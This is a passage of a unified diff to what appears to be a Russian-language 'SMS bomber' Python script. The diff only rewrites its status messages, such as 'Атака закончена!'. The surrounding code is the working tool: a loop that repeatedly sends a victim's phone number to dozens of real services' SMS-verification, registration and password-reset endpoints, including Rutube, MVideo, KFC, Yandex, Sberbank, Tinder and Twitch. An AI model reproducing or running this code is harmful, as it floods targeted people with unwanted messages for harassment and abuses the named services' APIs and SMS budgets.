+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -978,7 +978,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -986,10 +986,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -998,10 +998,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -1010,10 +1010,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -1023,10 +1023,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -1036,10 +1036,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -1047,10 +1047,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -1060,10 +1060,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -1071,10 +1071,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -1084,10 +1084,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -1099,10 +1099,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -1110,10 +1110,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -1121,10 +1121,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -1132,10 +1132,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -1143,10 +1143,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -1155,10 +1155,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -1167,10 +1167,10 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -1179,10 +1179,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -1192,10 +1192,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -1205,10 +1205,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -1217,10 +1217,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -1228,10 +1228,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -1239,10 +1239,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -1250,10 +1250,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -1262,10 +1262,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -1275,10 +1275,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -1287,10 +1287,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -1298,10 +1298,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -1311,10 +1311,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -1322,10 +1322,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -1333,10 +1333,10 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -1347,10 +1347,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -1359,10 +1359,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -1370,10 +1370,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -1382,10 +1382,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -1393,10 +1393,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -1406,10 +1406,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -1417,10 +1417,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
@@ -1428,10 +1428,10 @@ if call == str(2):
             print('[+] Delivery отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -1441,17 +1441,17 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -1460,10 +1460,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -1471,10 +1471,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -1483,10 +1483,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -1496,10 +1496,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -1507,10 +1507,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -1521,7 +1521,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -1529,10 +1529,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -1541,10 +1541,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -1553,10 +1553,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -1566,10 +1566,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -1579,10 +1579,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -1590,10 +1590,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -1603,10 +1603,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -1614,10 +1614,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -1627,10 +1627,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -1642,10 +1642,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -1653,10 +1653,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -1664,10 +1664,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -1675,10 +1675,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -1686,10 +1686,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
